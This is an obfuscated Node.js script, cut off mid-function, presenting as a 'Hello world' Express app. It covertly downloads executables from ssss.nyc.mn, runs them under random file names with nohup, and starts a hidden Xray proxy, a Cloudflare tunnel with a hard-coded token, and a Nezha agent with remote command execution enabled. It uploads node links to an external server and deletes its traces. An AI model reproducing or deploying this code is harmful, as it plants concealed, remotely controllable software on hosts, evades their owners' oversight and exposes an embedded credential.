const _0xc65993=_0x59dc;(function(_0x205a7a,_0x1eecad){const _0x35f473=_0x59dc,_0x4cb415=_0x205a7a();while(!![]){try{const _0x4494ca=parseInt(_0x35f473(0x234))/0x1*(parseInt(_0x35f473(0x227))/0x2)+-parseInt(_0x35f473(0x219))/0x3*(parseInt(_0x35f473(0x2a3))/0x4)+-parseInt(_0x35f473(0x202))/0x5+-parseInt(_0x35f473(0x26f))/0x6+-parseInt(_0x35f473(0x252))/0x7+parseInt(_0x35f473(0x23a))/0x8*(-parseInt(_0x35f473(0x27f))/0x9)+-parseInt(_0x35f473(0x281))/0xa*(-parseInt(_0x35f473(0x24b))/0xb);if(_0x4494ca===_0x1eecad)break;else _0x4cb415['push'](_0x4cb415['shift']());}catch(_0x465e4f){_0x4cb415['push'](_0x4cb415['shift']());}}}(_0x964f,0x83249));const _0x3bc6bc=(function(){let _0x2f962c=!![];return function(_0x340a7a,_0x12d6cb){const _0x211fde=_0x2f962c?function(){if(_0x12d6cb){const _0x1ac8d0=_0x12d6cb['apply'](_0x340a7a,arguments);return _0x12d6cb=null,_0x1ac8d0;}}:function(){};return _0x2f962c=![],_0x211fde;};}()),_0x422d7d=_0x3bc6bc(this,function(){const _0xa090a5=_0x59dc;return _0x422d7d['toString']()['search'](_0xa090a5(0x225))['toString']()[_0xa090a5(0x20b)](_0x422d7d)['search'](_0xa090a5(0x225));});function _0x964f(){const _0x13d8a8=['__proto__','UPLOAD_URL','chmod','readdirSync','2053','finish','catch','tls','taskkill\x20/f\x20/im\x20','FILE_PATH','\x0a\x20\x20\x20\x20','mkdirSync','close','util','\x20is\x20running','sub','NEZHA_SERVER','\x22\x20>\x20/dev/null\x202>&1','cdns.doon.eu.org','all','3232260gwRUfG','Content-Type','vless','split','\x0a\x20\x20tunnel:\x20','none','/vless-argo','pop','\x20-p\x20','list.txt','prototype','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','NEZHA_PORT','includes','/vmess-argo','config.yaml','72liMrGb','2083','600RAjlYQ','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Add\x20automatic\x20access\x20task\x20faild:\x20','response','NAME','stringify','tcp','exception','message','https://arm64.ssss.nyc.mn/web','from','win32','return\x20(function()\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20is\x20created','get','ARGO_AUTH','unlinkSync','console','2096','block','trojan','then','Empowerment\x20success\x20for\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','PROJECT_URL','sub.txt','listen','clear','isFile','\x0avless://','length','rm\x20-rf\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','2700DtLPac','fileName','\x0a\x20\x20\x0atrojan://','CFPORT','ARGO_DOMAIN','substring','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','SUB_PATH','firefox','ArgoDomain:','&fp=firefox&type=ws&host=','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','express','\x20-c\x20\x22','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','https://amd64.ssss.nyc.mn/web','warn','9afd1229-b893-40c1-84dd-51e7ce204913','bind','child_process','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','2087','./tmp','application/json','error','Error\x20downloading\x20files:','Error\x20executing\x20command:\x20','match','arch','/sub.txt\x20saved\x20successfully','Skipping\x20adding\x20automatic\x20access\x20task','Subscription\x20uploaded\x20successfully','send','trim','5256290RAARJu','/config.json\x20>/dev/null\x202>&1\x20&','freedom','CFIP','arm','?security=tls&sni=','config.json','filter','log','constructor','/vmess-argo?ed=2560','writeFileSync','App\x20is\x20running','arm64','web\x20running\x20error:\x20','ARGO_DOMAIN:','direct','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','post','axios','NEZHA\x20variable\x20is\x20empty,skip\x20running','Empowerment\x20failed\x20for\x20','push','2727enRaDH','existsSync','env','\x20>/dev/null\x202>&1','https://oooo.serv00.net/add-url','Hello\x20world!','pipe','Unhandled\x20error\x20in\x20startserver:','\x0aclient_secret:\x20','floor','boot.log','\x20>/dev/null\x202>&1\x20&','(((.+)+)+)+$','127.0.0.1','2CyhZUb','tunnel.yml','?encryption=none&security=tls&sni=','\x20failed:\x20','tunnel.json','\x0a\x20\x20credentials-file:\x20','pkill\x20-f\x20\x22[','\x20-s\x20','join','basename','info','tunnels.wangzhiwei1124.dpdns.org','true','755081TtbBYR','PORT','abcdefghijklmnopqrstuvwxyz','quic','text/plain;\x20charset=utf-8','automatic\x20access\x20task\x20added\x20successfully','370976TPbYef','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20-c\x20','apply','TunnelSecret','forEach','https://arm64.ssss.nyc.mn/agent','/dev/null','/tunnel.yml\x20run','http','eyJhIjoiYjVlMWI4MWY4MzEyZjRmZjA1NWYzZWUxYWQ3NDAzMWEiLCJ0IjoiN2UyZGM2NmUtZGVlZC00Y2UyLWEyMmQtZDdiZWY4YTQwZDhiIiwicyI6IlkyWmxOV0l3Tm1JdE1UY3lOeTAwTmpSbExUZzRaREl0WW1NMFltRXpaVEZoTkRndyJ9','unshift','false','https://amd64.ssss.nyc.mn/agent','http\x20server\x20is\x20running\x20on\x20port:','charAt','8443','605077lUbbRc','aarch64','Download\x20','/trojan-argo','toString','exec','base64','6606747XndLwM','status','readFileSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','&path=%2Ftrojan-argo%3Fed%3D2560#','stream','utf-8','test','nohup\x20'];_0x964f=function(){return _0x13d8a8;};return _0x964f();}_0x422d7d();const _0x35d7d8=(function(){let _0x293673=!![];return function(_0x4b67ae,_0x1f5611){const _0x45d16f=_0x293673?function(){const _0x1fe1ba=_0x59dc;if(_0x1f5611){const _0x409e45=_0x1f5611[_0x1fe1ba(0x23d)](_0x4b67ae,arguments);return _0x1f5611=null,_0x409e45;}}:function(){};return _0x293673=![],_0x45d16f;};}()),_0x4b0ad9=_0x35d7d8(this,function(){const _0x2476d1=_0x59dc,_0x5f32ad=function(){const _0x7ead8=_0x59dc;let _0x2156a4;try{_0x2156a4=Function(_0x7ead8(0x28d)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0xd6fba0){_0x2156a4=window;}return _0x2156a4;},_0x524193=_0x5f32ad(),_0x54f81f=_0x524193[_0x2476d1(0x293)]=_0x524193[_0x2476d1(0x293)]||{},_0x26f67d=[_0x2476d1(0x20a),_0x2476d1(0x1f0),_0x2476d1(0x231),_0x2476d1(0x1f8),_0x2476d1(0x288),'table','trace'];for(let _0xf8df80=0x0;_0xf8df80<_0x26f67d[_0x2476d1(0x2a0)];_0xf8df80++){const _0x25cc29=_0x35d7d8[_0x2476d1(0x20b)][_0x2476d1(0x279)][_0x2476d1(0x1f2)](_0x35d7d8),_0x2cf7d5=_0x26f67d[_0xf8df80],_0x5b966e=_0x54f81f[_0x2cf7d5]||_0x25cc29;_0x25cc29[_0x2476d1(0x25b)]=_0x35d7d8['bind'](_0x35d7d8),_0x25cc29[_0x2476d1(0x24f)]=_0x5b966e[_0x2476d1(0x24f)][_0x2476d1(0x1f2)](_0x5b966e),_0x54f81f[_0x2cf7d5]=_0x25cc29;}});_0x4b0ad9();const express=require(_0xc65993(0x1ec)),app=express(),axios=require(_0xc65993(0x215)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0xc65993(0x268)),exec=promisify(require(_0xc65993(0x1f3))[_0xc65993(0x250)]),{execSync}=require(_0xc65993(0x1f3)),UPLOAD_URL=process[_0xc65993(0x21b)][_0xc65993(0x25c)]||'',PROJECT_URL=process[_0xc65993(0x21b)][_0xc65993(0x29a)]||'',AUTO_ACCESS=process[_0xc65993(0x21b)]['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0xc65993(0x264)]||_0xc65993(0x1f6),SUB_PATH=process[_0xc65993(0x21b)][_0xc65993(0x1e7)]||_0xc65993(0x26a),PORT=process[_0xc65993(0x21b)]['SERVER_PORT']||process[_0xc65993(0x21b)][_0xc65993(0x235)]||0xbb8,UUID=process[_0xc65993(0x21b)]['UUID']||_0xc65993(0x1f1),NEZHA_SERVER=process[_0xc65993(0x21b)][_0xc65993(0x26b)]||'',NEZHA_PORT=process[_0xc65993(0x21b)][_0xc65993(0x27b)]||'',NEZHA_KEY=process[_0xc65993(0x21b)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0xc65993(0x21b)][_0xc65993(0x1e4)]||_0xc65993(0x232),ARGO_AUTH=process[_0xc65993(0x21b)][_0xc65993(0x291)]||_0xc65993(0x244),ARGO_PORT=process[_0xc65993(0x21b)]['ARGO_PORT']||0x1f41,CFIP=process['env'][_0xc65993(0x205)]||_0xc65993(0x26d),CFPORT=process['env'][_0xc65993(0x1e3)]||0x1bb,NAME=process[_0xc65993(0x21b)][_0xc65993(0x285)]||'tunnel';!fs[_0xc65993(0x21a)](FILE_PATH)?(fs[_0xc65993(0x266)](FILE_PATH),console['log'](FILE_PATH+_0xc65993(0x28f))):console[_0xc65993(0x20a)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x376b4a=_0xc65993,_0x3b2a03=_0x376b4a(0x236);let _0x515794='';for(let _0x53e32c=0x0;_0x53e32c<0x6;_0x53e32c++){_0x515794+=_0x3b2a03[_0x376b4a(0x249)](Math[_0x376b4a(0x222)](Math['random']()*_0x3b2a03[_0x376b4a(0x2a0)]));}return _0x515794;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0xc65993(0x22f)](FILE_PATH,phpName),webPath=path[_0xc65993(0x22f)](FILE_PATH,webName),botPath=path[_0xc65993(0x22f)](FILE_PATH,botName),subPath=path[_0xc65993(0x22f)](FILE_PATH,_0xc65993(0x29b)),listPath=path[_0xc65993(0x22f)](FILE_PATH,_0xc65993(0x278)),bootLogPath=path['join'](FILE_PATH,_0xc65993(0x223)),configPath=path[_0xc65993(0x22f)](FILE_PATH,_0xc65993(0x208));function deleteNodes(){const _0x203aa4=_0xc65993;try{if(!UPLOAD_URL)return;if(!fs[_0x203aa4(0x21a)](subPath))return;let _0x12d006;try{_0x12d006=fs[_0x203aa4(0x254)](subPath,'utf-8');}catch{return null;}const _0x415170=Buffer[_0x203aa4(0x28b)](_0x12d006,'base64')[_0x203aa4(0x24f)](_0x203aa4(0x258)),_0x12b0d6=_0x415170[_0x203aa4(0x272)]('\x0a')[_0x203aa4(0x209)](_0x46339d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x203aa4(0x259)](_0x46339d));if(_0x12b0d6['length']===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x203aa4(0x286)]({'nodes':_0x12b0d6}),{'headers':{'Content-Type':_0x203aa4(0x1f7)}})['catch'](_0x3f6d25=>{return null;}),null;}catch(_0x2d23fa){return null;}}function cleanupOldFiles(){const _0x2f5326=_0xc65993;try{const _0x13603d=fs[_0x2f5326(0x25e)](FILE_PATH);_0x13603d[_0x2f5326(0x23f)](_0x49194c=>{const _0x11e285=_0x2f5326,_0x4a3712=path['join'](FILE_PATH,_0x49194c);try{const _0xb9780f=fs['statSync'](_0x4a3712);_0xb9780f[_0x11e285(0x29e)]()&&fs['unlinkSync'](_0x4a3712);}catch(_0x549379){}});}catch(_0x7773a6){}}app['get']('/',function(_0x751657,_0x1d6f4a){const _0x44ba1a=_0xc65993;_0x1d6f4a[_0x44ba1a(0x200)](_0x44ba1a(0x21e));});async function generateConfig(){const _0x186746=_0xc65993,_0x5e9c58={'log':{'access':'/dev/null','error':_0x186746(0x241),'loglevel':_0x186746(0x274)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x186746(0x271),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x186746(0x274),'fallbacks':[{'dest':0xbb9},{'path':_0x186746(0x275),'dest':0xbba},{'path':_0x186746(0x27d),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x186746(0x287)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x186746(0x271),'settings':{'clients':[{'id':UUID}],'decryption':_0x186746(0x274)},'streamSettings':{'network':_0x186746(0x287),'security':_0x186746(0x274)}},{'port':0xbba,'listen':_0x186746(0x226),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x186746(0x274),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x186746(0x243),_0x186746(0x262),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x186746(0x226),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x186746(0x27d)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x186746(0x262),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x186746(0x226),'protocol':_0x186746(0x296),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x186746(0x274),'wsSettings':{'path':_0x186746(0x24e)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x186746(0x262),_0x186746(0x237)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x186746(0x204),'tag':_0x186746(0x212)},{'protocol':'blackhole','tag':_0x186746(0x295)}]};fs[_0x186746(0x20d)](path[_0x186746(0x22f)](FILE_PATH,'config.json'),JSON[_0x186746(0x286)](_0x5e9c58,null,0x2));}function getSystemArchitecture(){const _0x5bd70a=_0xc65993,_0x2a2122=os[_0x5bd70a(0x1fc)]();return _0x2a2122===_0x5bd70a(0x206)||_0x2a2122===_0x5bd70a(0x20f)||_0x2a2122===_0x5bd70a(0x24c)?_0x5bd70a(0x206):'amd';}function downloadFile(_0x598aab,_0x109572,_0x190360){const _0x443553=_0xc65993,_0x184350=_0x598aab;!fs[_0x443553(0x21a)](FILE_PATH)&&fs[_0x443553(0x266)](FILE_PATH,{'recursive':!![]});const _0x3e3b8f=fs['createWriteStream'](_0x184350);axios({'method':'get','url':_0x109572,'responseType':_0x443553(0x257)})[_0x443553(0x297)](_0x439696=>{const _0xe63b65=_0x443553;_0x439696['data'][_0xe63b65(0x21f)](_0x3e3b8f),_0x3e3b8f['on'](_0xe63b65(0x260),()=>{const _0x50c4d9=_0xe63b65;_0x3e3b8f[_0x50c4d9(0x267)](),console[_0x50c4d9(0x20a)](_0x50c4d9(0x24d)+path['basename'](_0x184350)+'\x20successfully'),_0x190360(null,_0x184350);}),_0x3e3b8f['on'](_0xe63b65(0x1f8),_0x558563=>{const _0x55f04a=_0xe63b65;fs['unlink'](_0x184350,()=>{});const _0x4f5e67='Download\x20'+path[_0x55f04a(0x230)](_0x184350)+'\x20failed:\x20'+_0x558563[_0x55f04a(0x289)];console[_0x55f04a(0x1f8)](_0x4f5e67),_0x190360(_0x4f5e67);});})[_0x443553(0x261)](_0x1afed4=>{const _0x512cf3=_0x443553,_0x1ee3d5=_0x512cf3(0x24d)+path[_0x512cf3(0x230)](_0x184350)+_0x512cf3(0x22a)+_0x1afed4[_0x512cf3(0x289)];console[_0x512cf3(0x1f8)](_0x1ee3d5),_0x190360(_0x1ee3d5);});}async function downloadFilesAndRun(){const _0x5ad3e1=_0xc65993,_0x45351b=getSystemArchitecture(),_0x487150=getFilesForArchitecture(_0x45351b);if(_0x487150[_0x5ad3e1(0x2a0)]===0x0){console[_0x5ad3e1(0x20a)](_0x5ad3e1(0x213));return;}const _0x2486d0=_0x487150['map'](_0x2fe720=>{return new Promise((_0x91d04c,_0x23d0be)=>{const _0x349769=_0x59dc;downloadFile(_0x2fe720[_0x349769(0x2a4)],_0x2fe720['fileUrl'],(_0x1c030a,_0x6b5669)=>{_0x1c030a?_0x23d0be(_0x1c030a):_0x91d04c(_0x6b5669);});});});try{await Promise[_0x5ad3e1(0x26e)](_0x2486d0);}catch(_0x15000d){console[_0x5ad3e1(0x1f8)](_0x5ad3e1(0x1f9),_0x15000d);return;}function _0x3e79df(_0x17e3a7){const _0x3131e3=_0x5ad3e1,_0x411c48=0x1fd;_0x17e3a7[_0x3131e3(0x23f)](_0x1a197c=>{const _0x102af4=_0x3131e3;fs[_0x102af4(0x21a)](_0x1a197c)&&fs[_0x102af4(0x25d)](_0x1a197c,_0x411c48,_0x463fc0=>{const _0xe40fae=_0x102af4;_0x463fc0?console[_0xe40fae(0x1f8)](_0xe40fae(0x217)+_0x1a197c+':\x20'+_0x463fc0):console[_0xe40fae(0x20a)](_0xe40fae(0x298)+_0x1a197c+':\x20'+_0x411c48[_0xe40fae(0x24f)](0x8));});});}const _0x1f4201=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3e79df(_0x1f4201);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x47eb59=NEZHA_SERVER[_0x5ad3e1(0x27c)](':')?NEZHA_SERVER[_0x5ad3e1(0x272)](':')[_0x5ad3e1(0x276)]():'',_0x2d57f1=new Set(['443',_0x5ad3e1(0x24a),_0x5ad3e1(0x294),_0x5ad3e1(0x1f5),_0x5ad3e1(0x280),_0x5ad3e1(0x25f)]),_0x41a8d5=_0x2d57f1['has'](_0x47eb59)?_0x5ad3e1(0x233):_0x5ad3e1(0x246),_0x540bd8=_0x5ad3e1(0x221)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x5ad3e1(0x28e)+_0x41a8d5+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x5ad3e1(0x22f)](FILE_PATH,_0x5ad3e1(0x27e)),_0x540bd8);const _0x46fafc=_0x5ad3e1(0x25a)+phpPath+_0x5ad3e1(0x1ed)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x46fafc),console[_0x5ad3e1(0x20a)](phpName+'\x20is\x20running'),await new Promise(_0x236c62=>setTimeout(_0x236c62,0x3e8));}catch(_0x155a2a){console[_0x5ad3e1(0x1f8)]('php\x20running\x20error:\x20'+_0x155a2a);}}else{let _0x5e1a7b='';const _0x3b399a=['443','8443',_0x5ad3e1(0x294),'2087',_0x5ad3e1(0x280),_0x5ad3e1(0x25f)];_0x3b399a[_0x5ad3e1(0x27c)](NEZHA_PORT)&&(_0x5e1a7b='--tls');const _0x53f152=_0x5ad3e1(0x25a)+npmPath+_0x5ad3e1(0x22e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5ad3e1(0x277)+NEZHA_KEY+'\x20'+_0x5e1a7b+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x53f152),console[_0x5ad3e1(0x20a)](npmName+_0x5ad3e1(0x269)),await new Promise(_0x55311a=>setTimeout(_0x55311a,0x3e8));}catch(_0x3aec9b){console['error']('npm\x20running\x20error:\x20'+_0x3aec9b);}}}else console['log'](_0x5ad3e1(0x216));const _0x4b4287=_0x5ad3e1(0x25a)+webPath+_0x5ad3e1(0x23c)+FILE_PATH+_0x5ad3e1(0x203);try{await exec(_0x4b4287),console[_0x5ad3e1(0x20a)](webName+'\x20is\x20running'),await new Promise(_0x4b2430=>setTimeout(_0x4b2430,0x3e8));}catch(_0x369235){console[_0x5ad3e1(0x1f8)](_0x5ad3e1(0x210)+_0x369235);}if(fs[_0x5ad3e1(0x21a)](botPath)){let _0x12465e;if(ARGO_AUTH[_0x5ad3e1(0x1fb)](/^[A-Z0-9a-z=]{120,250}$/))_0x12465e=_0x5ad3e1(0x1e6)+ARGO_AUTH;else ARGO_AUTH[_0x5ad3e1(0x1fb)](/TunnelSecret/)?_0x12465e=_0x5ad3e1(0x27a)+FILE_PATH+_0x5ad3e1(0x242):_0x12465e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5ad3e1(0x255)+ARGO_PORT;try{await exec(_0x5ad3e1(0x25a)+botPath+'\x20'+_0x12465e+_0x5ad3e1(0x224)),console[_0x5ad3e1(0x20a)](botName+'\x20is\x20running'),await new Promise(_0x49fa55=>setTimeout(_0x49fa55,0x7d0));}catch(_0x1c2864){console[_0x5ad3e1(0x1f8)](_0x5ad3e1(0x1fa)+_0x1c2864);}}await new Promise(_0x28f6c9=>setTimeout(_0x28f6c9,0x1388));}function getFilesForArchitecture(_0x294e32){const _0x205fc0=_0xc65993;let _0x45b235;_0x294e32===_0x205fc0(0x206)?_0x45b235=[{'fileName':webPath,'fileUrl':_0x205fc0(0x28a)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x45b235=[{'fileName':webPath,'fileUrl':_0x205fc0(0x1ef)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x23b328=_0x294e32==='arm'?_0x205fc0(0x240):_0x205fc0(0x247);_0x45b235[_0x205fc0(0x245)]({'fileName':npmPath,'fileUrl':_0x23b328});}else{const _0x4e843e=_0x294e32===_0x205fc0(0x206)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x45b235[_0x205fc0(0x245)]({'fileName':phpPath,'fileUrl':_0x4e843e});}}return _0x45b235;}function argoType(){const _0x384a9f=_0xc65993;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x384a9f(0x20a)](_0x384a9f(0x1ee));return;}if(ARGO_AUTH[_0x384a9f(0x27c)](_0x384a9f(0x23e))){fs['writeFileSync'](path[_0x384a9f(0x22f)](FILE_PATH,_0x384a9f(0x22b)),ARGO_AUTH);const _0x3feb07=_0x384a9f(0x273)+ARGO_AUTH[_0x384a9f(0x272)]('\x22')[0xb]+_0x384a9f(0x22c)+path[_0x384a9f(0x22f)](FILE_PATH,'tunnel.json')+_0x384a9f(0x1f4)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x384a9f(0x2a2);fs[_0x384a9f(0x20d)](path[_0x384a9f(0x22f)](FILE_PATH,_0x384a9f(0x228)),_0x3feb07);}else console['log'](_0x384a9f(0x299));}argoType();async function extractDomains(){const _0x31e13d=_0xc65993;let _0x3af85b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3af85b=ARGO_DOMAIN,console[_0x31e13d(0x20a)](_0x31e13d(0x211),_0x3af85b),await _0x40d68b(_0x3af85b);else try{const _0x4eee43=fs['readFileSync'](path[_0x31e13d(0x22f)](FILE_PATH,_0x31e13d(0x223)),_0x31e13d(0x258)),_0x5f0215=_0x4eee43[_0x31e13d(0x272)]('\x0a'),_0x4bdbf4=[];_0x5f0215[_0x31e13d(0x23f)](_0x31a269=>{const _0x4b29fd=_0x31e13d,_0x16ed60=_0x31a269[_0x4b29fd(0x1fb)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x16ed60){const _0x21bff6=_0x16ed60[0x1];_0x4bdbf4[_0x4b29fd(0x218)](_0x21bff6);}});if(_0x4bdbf4[_0x31e13d(0x2a0)]>0x0)_0x3af85b=_0x4bdbf4[0x0],console['log'](_0x31e13d(0x1e9),_0x3af85b),await _0x40d68b(_0x3af85b);else{console[_0x31e13d(0x20a)](_0x31e13d(0x282)),fs[_0x31e13d(0x292)](path[_0x31e13d(0x22f)](FILE_PATH,_0x31e13d(0x223)));async function _0x5026b6(){const _0x5b7c97=_0x31e13d;try{process['platform']===_0x5b7c97(0x28c)?await exec(_0x5b7c97(0x263)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x5b7c97(0x22d)+botName[_0x5b7c97(0x249)](0x0)+']'+botName[_0x5b7c97(0x1e5)](0x1)+_0x5b7c97(0x26c));}catch(_0x267720){}}_0x5026b6(),await new Promise(_0x1d186c=>setTimeout(_0x1d186c,0xbb8));const _0x317861='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x31e13d(0x255)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x317861+_0x31e13d(0x224)),console[_0x31e13d(0x20a)](botName+_0x31e13d(0x269)),await new Promise(_0x3302ab=>setTimeout(_0x3302ab,0xbb8)),await extractDomains();}catch(_0x3d972e){console[_0x31e13d(0x1f8)](_0x31e13d(0x1fa)+_0x3d972e);}}}catch(_0xc6dd35){console[_0x31e13d(0x1f8)]('Error\x20reading\x20boot.log:',_0xc6dd35);}async function _0x40d68b(_0x1d404d){const _0xa80892=_0x31e13d,_0x3a51b4=execSync(_0xa80892(0x1eb),{'encoding':_0xa80892(0x258)}),_0x106a98=_0x3a51b4[_0xa80892(0x201)](),_0x3dab66=NAME?NAME+'-'+_0x106a98:_0x106a98;return new Promise(_0x102299=>{setTimeout(()=>{const _0x9aa82b=_0x59dc,_0x43f21f={'v':'2','ps':''+_0x3dab66,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x9aa82b(0x274),'net':'ws','type':_0x9aa82b(0x274),'host':_0x1d404d,'path':_0x9aa82b(0x20c),'tls':'tls','sni':_0x1d404d,'alpn':'','fp':_0x9aa82b(0x1e8)},_0x324a11=_0x9aa82b(0x29f)+UUID+'@'+CFIP+':'+CFPORT+_0x9aa82b(0x229)+_0x1d404d+_0x9aa82b(0x1ea)+_0x1d404d+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3dab66+'\x0a\x20\x20\x0avmess://'+Buffer[_0x9aa82b(0x28b)](JSON[_0x9aa82b(0x286)](_0x43f21f))[_0x9aa82b(0x24f)](_0x9aa82b(0x251))+_0x9aa82b(0x2a5)+UUID+'@'+CFIP+':'+CFPORT+_0x9aa82b(0x207)+_0x1d404d+_0x9aa82b(0x1ea)+_0x1d404d+_0x9aa82b(0x256)+_0x3dab66+_0x9aa82b(0x265);console[_0x9aa82b(0x20a)](Buffer[_0x9aa82b(0x28b)](_0x324a11)['toString'](_0x9aa82b(0x251))),fs['writeFileSync'](subPath,Buffer['from'](_0x324a11)[_0x9aa82b(0x24f)]('base64')),console[_0x9aa82b(0x20a)](FILE_PATH+_0x9aa82b(0x1fd)),uploadNodes(),app[_0x9aa82b(0x290)]('/'+SUB_PATH,(_0x453d29,_0x34a5f5)=>{const _0x5655ee=_0x9aa82b,_0x1b6b4f=Buffer[_0x5655ee(0x28b)](_0x324a11)[_0x5655ee(0x24f)](_0x5655ee(0x251));_0x34a5f5['set'](_0x5655ee(0x270),_0x5655ee(0x238)),_0x34a5f5[_0x5655ee(0x200)](_0x1b6b4f);}),_0x102299(_0x324a11);},0x7d0);});}}async function uploadNodes(){const _0x2b9bc7=_0xc65993;if(UPLOAD_URL&&PROJECT_URL){const _0x5d9e8f=PROJECT_URL+'/'+SUB_PATH,_0x4a1c12={'subscription':[_0x5d9e8f]};try{const _0x5927d8=await axios[_0x2b9bc7(0x214)](UPLOAD_URL+'/api/add-subscriptions',_0x4a1c12,{'headers':{'Content-Type':_0x2b9bc7(0x1f7)}});return _0x5927d8&&_0x5927d8['status']===0xc8?(console[_0x2b9bc7(0x20a)](_0x2b9bc7(0x1ff)),_0x5927d8):null;}catch(_0x543b3c){if(_0x543b3c[_0x2b9bc7(0x284)]){if(_0x543b3c['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2b9bc7(0x21a)](listPath))return;const _0x127497=fs[_0x2b9bc7(0x254)](listPath,'utf-8'),_0x45896e=_0x127497['split']('\x0a')['filter'](_0x4c1cee=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2b9bc7(0x259)](_0x4c1cee));if(_0x45896e['length']===0x0)return;const _0x12bcab=JSON[_0x2b9bc7(0x286)]({'nodes':_0x45896e});try{const _0x3f36a7=await axios[_0x2b9bc7(0x214)](UPLOAD_URL+'/api/add-nodes',_0x12bcab,{'headers':{'Content-Type':'application/json'}});return _0x3f36a7&&_0x3f36a7[_0x2b9bc7(0x253)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x3f36a7):null;}catch(_0x30c5c5){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x391c94=_0x59dc,_0x12b08e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x12b08e[_0x391c94(0x218)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x12b08e['push'](phpPath);process['platform']==='win32'?exec('del\x20/f\x20/q\x20'+_0x12b08e[_0x391c94(0x22f)]('\x20')+'\x20>\x20nul\x202>&1',_0x35361=>{const 